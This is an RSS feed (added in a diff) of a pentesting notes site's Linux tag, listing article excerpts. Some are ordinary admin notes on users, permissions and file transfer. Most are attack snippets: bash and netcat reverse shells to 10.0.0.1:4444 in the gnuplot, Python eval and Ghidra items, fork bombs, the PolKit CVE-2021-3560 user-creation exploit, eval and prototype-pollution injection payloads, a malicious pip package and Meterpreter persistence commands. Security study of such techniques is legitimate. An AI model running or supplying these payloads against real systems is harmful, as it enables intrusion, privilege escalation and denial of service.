@@ -1,0 +1,187 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Linux on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/tags/linux/</link>
+    <description>Recent content in Linux on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Sat, 11 Nov 2023 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>File Transfer in Linux</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/management/file-transfer-in-linux/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/management/file-transfer-in-linux/</guid>
+      <description>Using Wget linkIn machine A, Start a web server.&#xA;python -m http.server # We can specify which directory to host by `--directory` option. python -m http.server --directory /usr/bin In machine B, download a file from the web server of machine A.&#xA;wget http://&amp;lt;ip-for-machine-A&amp;gt;:8000/example.txt # Download recursively # -r: recursive # -np: no parent # Don&amp;#39;t forget &amp;#34;/&amp;#34; after the directory name wget -r -np http://&amp;lt;ip-for-machine-A&amp;gt;/somedir/ Using Netcat linkTransfer a File linkIn machine A, start a listener for receiving a file.</description>
+    </item>
+    <item>
+      <title>Connect to Android Device from PC using SSH</title>
+      <link>https://documentnation.github.io/docs/hdks/mobile/android/connect-to-android-device-from-pc/</link>
+      <pubDate>Sun, 05 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/mobile/android/connect-to-android-device-from-pc/</guid>
+      <description>1. Preparation link1. Create SSH Private/Public Key Pair on Linux Machine linkIn our machine, we need to generate SSH key pair for connecting to SSH server of Android device.&#xA;After running the following command, there&amp;rsquo;s no problem with no passphrase if it&amp;rsquo;s for testing purpose.&#xA;ssh-keygen -t ed25519 -f id_ed25519_android After that, store the generated files (id_25519_android, id_25519_android.pub) into ~/.ssh folder.&#xA;# If `.ssh` directory does not exist, create a new one.</description>
+    </item>
+    <item>
+      <title>Shell Scripting</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/management/shell-scripting/</link>
+      <pubDate>Fri, 03 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/management/shell-scripting/</guid>
+      <description>For Loop link #!/bin/bash for i in {1..5} do echo &amp;#34;Hello $i&amp;#34; done 4 Digits Loop link #!/bin/bash for i in {0000..9999} do echo $i done Read Text Line by Line linkread-text.sh&#xA;#!/bin/bash while read line do echo $line done &amp;lt; example.txt Retrieve Arguments linkGetopts is useful.&#xA;Create &amp;ldquo;my_opt.sh&amp;rdquo;.&#xA;#!/bin/bash getopts c cmd echo $cmd Run. This output is the current username.&#xA;./my_opt.sh -cwhoami While Loop and Retrieving Arguments&#xA;Create “my_while_opt.</description>
+    </item>
+    <item>
+      <title>Add &amp; Delete Groups in Linux</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/management/add-and-delete-groups-in-linux/</link>
+      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/management/add-and-delete-groups-in-linux/</guid>
+      <description>Add/Delete Groups link # Add a group groupadd &amp;lt;group&amp;gt; # Delete a group groupdel &amp;lt;group&amp;gt; Add User to Group link # -a: Append the user to the specific group # -G: Group usermod -a -G &amp;lt;group&amp;gt; &amp;lt;user&amp;gt; # Change user&amp;#39;s primary group # -g: GID usermod -g &amp;lt;group&amp;gt; &amp;lt;user&amp;gt; Sudo Group linkUssers who belong to sudo group can execute commands with sudo. To add a user to the sudo group, run the following command.</description>
+    </item>
+    <item>
+      <title>Add &amp; Delete Users in Linux</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/management/add-and-delete-user-in-linux/</link>
+      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/management/add-and-delete-user-in-linux/</guid>
+      <description>Add Users linkWe can use useradd or adduser command to add users in Linux.&#xA;useradd &amp;lt;user&amp;gt; adduser &amp;lt;user&amp;gt; # -p: Specify password useradd &amp;lt;user&amp;gt; -p &amp;lt;password&amp;gt; # -u: Specify UID # -g: Specify GID useradd -u 1000 -g 1000 &amp;lt;user&amp;gt; Set Password for User link # Set passwords. It&amp;#39;s stored in &amp;#34;/etc/shadow&amp;#34; passwd &amp;lt;user&amp;gt; Delete Users linkWe can use userdel or deluser command to delete users in Linux.&#xA;userdel &amp;lt;user&amp;gt; deluser &amp;lt;user&amp;gt; # -r: Remove home directory and mail spool userdel -r &amp;lt;user&amp;gt; List Users in Linux linkTo list users exist in Linux, run the following commands.</description>
+    </item>
+    <item>
+      <title>File &amp; Directory Ownership in Linux</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/management/file-and-directory-ownership-in-linux/</link>
+      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/management/file-and-directory-ownership-in-linux/</guid>
+      <description>Change Ownership to Specific User link chown &amp;lt;user&amp;gt; &amp;lt;file&amp;gt; chown &amp;lt;user&amp;gt; &amp;lt;dir&amp;gt; # -R: Recursive chown -R &amp;lt;user&amp;gt; &amp;lt;dir&amp;gt; Examples link chown tester example.txt chown tester ./example chown -R tester ./example Change Ownership to Specific Group link chown :&amp;lt;group&amp;gt; &amp;lt;file&amp;gt; chown :&amp;lt;group&amp;gt; &amp;lt;dir&amp;gt; # -R: Recursive chown -R :&amp;lt;group&amp;gt; &amp;lt;dir&amp;gt; Examples link chown :testers example.txt chown :testers ./example chown -R :testers ./example Change Ownership to Specific User&amp;amp;Group linkWe can give ownership of file/directory to specific both use and group at the same time.</description>
+    </item>
+    <item>
+      <title>File &amp; Directory Permission in Linux</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/management/file-and-directory-permission-in-linux/</link>
+      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/management/file-and-directory-permission-in-linux/</guid>
+      <description>Basic link Permission Number Character Read 4 r Write 2 w Execute 1 x We can use these value combination for changing permission.&#xA;For example,&#xA;Permission Number Character Read + Write + Execute 4+2+1=7 rwx Read + Write 4+2=6 rw Read 4 r Cheat Sheet linkRead/Write/Execute link Target Command User chmod 700 sample.txt chmod u+rwx sample.txt Group chmod 070 sample.txt chmod g+rwx sample.txt Others chmod 007 sample.txt chmod o+rwx sample.txt All chmod 777 sample.</description>
+    </item>
+    <item>
+      <title>Shared Library Hijacking</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/shared-library-hijacking/</link>
+      <pubDate>Wed, 13 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/shared-library-hijacking/</guid>
+      <description>Investigation linkWhen we find the binary file as setuid or sudo command, check the strings of the binary file.&#xA;strings ./example strace ./example gdb ./example ... foo.so ... If the binary file uses a shared library (e.g. foo.so) and this library can be modified, we can update it and get a root shell.&#xA;find / -type f -name &amp;#34;foo.so&amp;#34; 2&amp;gt;/dev/null ls -al /path/to/foo.so drwxrwxrwx 1 user user 64 Dec 15 09:13 foo.</description>
+    </item>
+    <item>
+      <title>Prototype Pollution in Server-Side</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/prototype-pollution-in-server-side/</link>
+      <pubDate>Fri, 11 Aug 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/prototype-pollution-in-server-side/</guid>
+      <description>Investigation linkIf the properties is affected by our pollution, our polluted properties might be injected into the target object as follow.&#xA;POST /user/update HTTP/1.1 Host: example.com ... { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.com&amp;#34;, &amp;#34;__proto__&amp;#34;: { &amp;#34;foo&amp;#34;: &amp;#34;bar&amp;#34; } } // Other option { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.com&amp;#34;, &amp;#34;constructor&amp;#34;: { &amp;#34;prototype&amp;#34;: { &amp;#34;foo&amp;#34;: &amp;#34;bar&amp;#34; } } } // Bypass sanitization 1 { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.com&amp;#34;, &amp;#34;__pro__proto__to__&amp;#34;: { &amp;#34;foo&amp;#34;: &amp;#34;bar&amp;#34; } } // Bypass sanitization 2 { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.</description>
+    </item>
+    <item>
+      <title>Fork Bomb</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/attack/fork-bomb/</link>
+      <pubDate>Mon, 24 Jul 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/attack/fork-bomb/</guid>
+      <description>Warning linkPlease don’t execute the following programs in system that you don’t want to harm.&#xA;Exploitation in C linkThis program forks child processes continuously.&#xA;#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; int main() { while (1) // Create a child process from the parent process. fork(); return 0; } Exploitation in Python link import os while True: os.fork() Exploitation in Bash link :(){ :|: &amp;amp; };: </description>
+    </item>
+    <item>
+      <title>PolKit Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/polkit-privilege-escalation/</link>
+      <pubDate>Mon, 24 Jul 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/polkit-privilege-escalation/</guid>
+      <description>CVE-2021-3560 link1. Send a dbus message to create a new user linkCreate a new user by sending a dbus message.&#xA;# string:tester: The new user named &amp;#34;tester&amp;#34;. # string:&amp;#34;Tester Account&amp;#34;: The description of the new user. # int32:1: sudo group dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:tester string:&amp;#34;Tester Account&amp;#34; int32:1 &amp;amp; sleep 0.005s; kill $! Then check the new user ID (uid).&#xA;id tester uid=1000(tester) gid=1000(tester) groups=1000(tester),27(sudo) 2. Generate a new password hash link # -6: SHA512 openssl passwd -6 password123 Copy the output hash.</description>
+    </item>
+    <item>
+      <title>Buffer Overflow Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/buffer-overflow-privilege-escalation/</link>
+      <pubDate>Wed, 05 Jul 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/buffer-overflow-privilege-escalation/</guid>
+      <description>Baron Samedit (Heap Buffer Overflow) CVE-2021-3156 link1. Check Vulnerability to Overwrite Heap Buffer in Target Machine link sudoedit -s &amp;#39;\&amp;#39; $(python3 -c &amp;#39;print(&amp;#34;A&amp;#34;*1000)&amp;#39;) malloc(): invalid size (unsorted) Aborted 2. Proof of Concept linkThere are various PoC online.&#xA;https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156. https://github.com/blasty/CVE-2021-3156 Pwfeedback link1. Check Enabling the Pwfeedback in /etc/sudoers linkIf so, when running sudo command and inputting password, asterisk will be displayed.&#xA;You can make it the buffer overflow.&#xA;cat /etc/sudoers # ------------------------------------------- .</description>
+    </item>
+    <item>
+      <title>Rust Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/rust-privilege-escalation/</link>
+      <pubDate>Tue, 27 Jun 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/rust-privilege-escalation/</guid>
+      <description>Reverse Shell linkReference: https://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs&#xA;We can create a binary or module to reverse shell.&#xA;cd /path/to/rust/project/src vim lib.rs (In vim editor, insert a reverse shell code into a file) cargo build </description>
+    </item>
+    <item>
+      <title>Gnuplot Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/gnuplot-privilege-escalation/</link>
+      <pubDate>Mon, 19 Jun 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/gnuplot-privilege-escalation/</guid>
+      <description>Command Execution linkThe script file of gnuplot can be used to execute system commands as below.&#xA;gnuplot test.plt Contents of the .plt is like the following.&#xA;system &amp;#34;whoami&amp;#34; # Reverse shell system &amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34; </description>
+    </item>
+    <item>
+      <title>WSL Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/wsl/wsl-pentesting/</link>
+      <pubDate>Sun, 28 May 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/wsl/wsl-pentesting/</guid>
+      <description>Interesting Files link cat /etc/wsl.conf Escape WSL to Windows Host Machine linkIf we’are currently on WSL machine, we can access to the host Windows machine as below.&#xA;cd /mnt/c/ If /mnt/c/ is empty, we need to mount the folder by running the following command.&#xA;cd / # -t: Limit the set of filesystem types # drvfs: A plugin for WSL # C: : Specify the Windows root mount -t drvfs C: /mnt/c </description>
+    </item>
+    <item>
+      <title>Pip Download Code Execution</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/pip-download-code-execution/</link>
+      <pubDate>Thu, 27 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/pip-download-code-execution/</guid>
+      <description>Exploitation link1. Create Malicious Python Package linkReference: https://github.com/wunderwuzzi23/this_is_fine_wuzzi&#xA;Assume the package named &amp;ldquo;exploitpy&amp;rdquo;.&#xA;We need to create &amp;ldquo;setup.py&amp;rdquo; in the project root, and &amp;quot;init.py&amp;quot;, &amp;ldquo;main.py&amp;rdquo; in src directory.&#xA;mkdir exploitpy cd exploitpy touch setup.py mkdir src touch src/__init__.py echo &amp;#39;print(&amp;#34;hello&amp;#34;)&amp;#39; &amp;gt; src/main.py Below is the content of the &amp;ldquo;setup.py&amp;rdquo;.&#xA;The arbitrary code is injected in the “RunCommand” method. It is executed when pip download command.&#xA;# setup.py from setuptools import setup, find_packages from setuptools.</description>
+    </item>
+    <item>
+      <title>SSSD Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sssd-privilege-escalation/</link>
+      <pubDate>Sun, 16 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sssd-privilege-escalation/</guid>
+      <description>Find Credentials link ls -la /var/lib/sss/ # Find credentials # If we find the hash, crack it using John or Hashcat. strings /var/lib/sss/db/example.ldb </description>
+    </item>
+    <item>
+      <title>Python Eval Code Execution</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-eval-code-execution/</link>
+      <pubDate>Tue, 11 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-eval-code-execution/</guid>
+      <description>Investigation link eval(text) eval(f&amp;#34;5 &amp;#43; {num}&amp;#34;) If the Python script allows us to input some value to the &amp;ldquo;text&amp;rdquo; variable, we can inject arbitrary code.&#xA;Arbitrary Code Execution linkMost of the time, we need to bypass another expression to execute our desired command.&#xA;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) &amp;lt;!-- Bypass another expression in eval --&amp;gt; ),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) &amp;#39;),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) },__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) ),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;)# Reverse Shell link __import__(&amp;#39;os&amp;#39;).system(&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;) </description>
+    </item>
+    <item>
+      <title>BorgBackup Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/backup/borgbackup-pentesting/</link>
+      <pubDate>Mon, 10 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/backup/borgbackup-pentesting/</guid>
+      <description>Extract Archives link borg extract /path/to/archive::&amp;lt;archive_name&amp;gt; Enter passphrase: </description>
+    </item>
+    <item>
+      <title>Ghidra Debug Mode RCE</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ghidra-debug-mode-rce/</link>
+      <pubDate>Fri, 31 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ghidra-debug-mode-rce/</guid>
+      <description>Exploitation link jdb -attach 127.0.0.1:18001 &amp;gt; classpath &amp;gt; classes Log4j2-TF-4-Scheduled-1[1] stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run() Log4j2-TF-4-Scheduled-1[1] print new java.lang.Runtime().exec(&amp;#34;nc 10.0.0.1 4444 -e /bin/sh&amp;#34;) </description>
+    </item>
+    <item>
+      <title>Chrome Remote Debugger Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/chrome-remote-debugger-pentesting/</link>
+      <pubDate>Sat, 11 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/chrome-remote-debugger-pentesting/</guid>
+      <description>Investigation link /usr/bin/google-chrome --remote-debugging-port=12345 If the target system is running Google Chrome Debugger with specific port, we can port forward and may be able to retrieve sensitive data in browser debugging mode.&#xA;Exploitation link1. Port Forwarding linkFirst off, start port forwarding in local machine.&#xA;ssh -L 12345:127.0.0.1:12345 remote-user@example.com 2. Configure Network Targets in Chrome linkAssume the chrome debugger is running on port 12345.&#xA;Open Chrome browser and input the following string in URL bar at the top of the window.</description>
+    </item>
+    <item>
+      <title>Doas Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/doas/</link>
+      <pubDate>Tue, 07 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/doas/</guid>
+      <description>Investigation linkFirst of all, search location of doas.conf.&#xA;find / -type f -name &amp;#34;doas.conf&amp;#34; 2&amp;gt;/dev/null Next check the configuration.&#xA;doas -C /path/to/doas.conf doas -C /etc/doas.conf # or cat /etc/doas.conf Execute doas as below.&#xA;doas -u root &amp;lt;command&amp;gt; &amp;lt;arg&amp;gt; Please also refer to GTFOBins to PrivEsc.</description>
+    </item>
+    <item>
+      <title>Snapd Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/snapd-privilege-escalation/</link>
+      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/snapd-privilege-escalation/</guid>
+      <description>dirty_sock (CVE-2019-7304) Version &amp;lt; 2.37 linkReference: https://www.exploit-db.com/exploits/46361</description>
+    </item>
+    <item>
+      <title>X11 (X Window System) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/protocol/x11-pentesting/</link>
+      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/protocol/x11-pentesting/</guid>
+      <description>Enumeration link nmap --script x11-access -p 6000 &amp;lt;target-ip&amp;gt; msf&amp;gt; use auxiliary/scanner/x11/open_x11 </description>
+    </item>
+    <item>
+      <title>Metasploit Cheat Sheets</title>
+      <link>https://documentnation.github.io/docs/hdks/tool/metasploit-cheat-sheets/</link>
+      <pubDate>Sat, 07 Jan 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/tool/metasploit-cheat-sheets/</guid>
+      <description>Msfconsole linkNo content yet.&#xA;Meterpreter link # List all sessions running on background msf&amp;gt; sessions # Start interacting with the session msf&amp;gt; sessions &amp;lt;session-id&amp;gt; # Drop into a system command shell meterpreter&amp;gt; shell # Upgrade to full functional shell python3 -c &amp;#39;import pty;pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # Persistence at the target system # -h: Help meterpreter&amp;gt; run persistence -h # -U: Automatically start when the user logs on # -i: The interal in seconds between each connection attempt # -p: The port on which the system running Metesploit is listening # -r: The IP of the system running Metasploit listening for the connect back meterpreter&amp;gt; run persistence -U -i 5 -p 443 -r &amp;lt;local-ip&amp;gt; Msfvenom linkNo content yet.</description>
+    </item>
+  </channel>
+</rss>
